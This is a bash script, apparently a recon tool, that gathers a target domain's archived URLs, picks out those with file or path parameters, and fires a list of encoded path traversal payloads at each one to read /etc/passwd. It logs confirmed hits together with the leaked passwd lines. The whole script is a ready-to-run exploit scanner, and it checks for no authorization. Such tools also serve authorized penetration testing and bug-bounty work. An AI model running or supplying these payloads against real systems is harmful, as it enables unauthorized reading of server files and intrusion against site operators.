#!/bin/bash

# Colors
GREEN='\033[0;32m'
RED='\033[0;31m'
NC='\033[0m'
YELLOW='\033[1;33m'

echo "🔐 Auto Path Traversal Scanner"

read -p "Enter target domain (e.g., example.com): " domain

if [[ -z "$domain" ]]; then
  echo "❌ Domain is required."
  exit 1
fi

# Setup
folder="traversal-recon-$domain-$(date +%Y%m%d-%H%M%S)"
mkdir "$folder"
cd "$folder" || exit

output_file="confirmed_traversals.txt"
touch "$output_file"

echo "📂 Recon folder: $folder"

# Step 1: Collect URLs using gau + wayback
echo -e "${YELLOW}🔍 Collecting URLs using gau and waybackurls...${NC}"
gau "$domain" --threads 50 > urls_gau.txt
waybackurls "$domain" > urls_wayback.txt
cat urls_gau.txt urls_wayback.txt | sort -u > all_urls.txt

echo "🧠 Total URLs collected: $(cat all_urls.txt | wc -l)"

# Step 2: Filter for interesting file-based parameters
echo "🎯 Filtering URLs with file/path/page parameters..."
grep -E "file=|path=|page=|include=|template=" all_urls.txt > candidate_urls.txt

if [[ ! -s candidate_urls.txt ]]; then
  echo "❌ No potential file-based URLs found."
  exit 1
fi

echo "🧪 Found $(wc -l < candidate_urls.txt) candidate URLs."

# Step 3: Define traversal payloads
payloads=(
"../../../../../../../../etc/passwd"
"..%2f..%2f..%2f..%2fetc%2fpasswd"
"....//....//etc/passwd"
"..%c0%af..%c0%afetc%c0%afpasswd"
"..%c1%1c..%c1%1cetc%c1%1cpasswd"
"..%252f..%252f..%252fetc%252fpasswd"
"..%5c..%5cetc%5cpasswd"
"../../../../../../../../etc/passwd%00.jpg"
"..%00/etc/passwd"
"..%2e%2e%2fetc%2fpasswd"
"..\\..\\..\\etc\\passwd"
)

# Step 4: Begin Testing
echo -e "${YELLOW}🚀 Launching traversal tests...${NC}"
while IFS= read -r url; do
    echo -e "${YELLOW}Testing: $url${NC}"
    for payload in "${payloads[@]}"; do
        test_url=$(echo "$url" | sed "s/=\([^&]*\)/=$payload/g")
        response=$(curl -sk --max-time 10 "$test_url")
        if echo "$response" | grep -qE "root:.*:0:0:"; then
            echo -e "${GREEN}[+] Path Traversal Success: $test_url${NC}"
            echo "$test_url" >> "$output_file"
            echo "$response" | grep "root:" | head -n 3 >> "$output_file"
        else
            echo -e "${RED}[-] $payload failed.${NC}"
        fi
    done
done < candidate_urls.txt

echo -e "\n✅ Done! Results saved to ${GREEN}$output_file${NC}"
